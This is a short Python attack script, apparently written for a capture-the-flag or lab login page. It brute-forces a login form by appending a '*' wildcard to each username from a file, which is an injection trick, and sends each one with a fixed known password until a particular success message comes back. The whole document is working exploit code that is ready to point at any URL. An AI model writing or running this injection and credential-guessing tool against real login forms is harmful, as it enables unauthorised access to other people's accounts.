import requests
import sys

# Check if the correct arguments are provided
if len(sys.argv) != 3:
    print("Usage: python script.py <url> <username_file>")
    sys.exit(1)

url = sys.argv[1]  # URL from command-line arguments
username_file = sys.argv[2]  # Username file from command-line arguments
password = "known_password"  # Replace with the valid password

# Read usernames from the file
try:
    with open(username_file, "r") as file:
        usernames = [line.strip() + "*" for line in file if line.strip()]  # Add wildcard to each username
except FileNotFoundError:
    print(f"Error: Username file '{username_file}' not found.")
    sys.exit(1)

# Try each username with the wildcard
for username in usernames:
    data = {
        "username": username,
        "password": password
    }
    try:
        # Send the POST request
        response = requests.post(url, data=data)

        # Check the response for success or failure
        if 'Login successful but the site is temporarily down for security reasons' in response.text:
            print(f"Attempt with username '{username}' was successful!")
            break
        elif 'Login failed' in response.text:
            print(f"Attempt with username '{username}' failed.")
        else:
            print(f"Attempt with username '{username}' received an unexpected response.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while trying username '{username}':", e)
